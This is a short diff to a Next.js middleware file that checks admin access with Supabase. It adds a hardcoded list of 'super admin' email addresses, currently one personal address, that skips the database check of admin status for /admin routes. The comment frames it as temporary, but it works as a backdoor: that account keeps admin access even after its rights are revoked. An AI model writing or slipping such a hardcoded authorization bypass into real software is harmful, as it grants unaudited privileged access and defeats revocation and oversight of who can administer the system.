@@ -41,8 +41,16 @@ export async function middleware(request: NextRequest) {
     return NextResponse.redirect(loginUrl);
   }
 
+  // Temporary hardcoded bypass: these emails always get through to /admin
+  // regardless of the profiles RLS or is_admin column state.
+  const SUPER_ADMINS = ["kufrekus4@gmail.com"];
+
   // For /admin routes, verify the user is still an active admin.
   if (user && pathname.startsWith("/admin")) {
+    if (SUPER_ADMINS.includes(user.email ?? "")) {
+      return supabaseResponse;
+    }
+
     try {
       const { data: userRow } = await supabase
         .from("users")
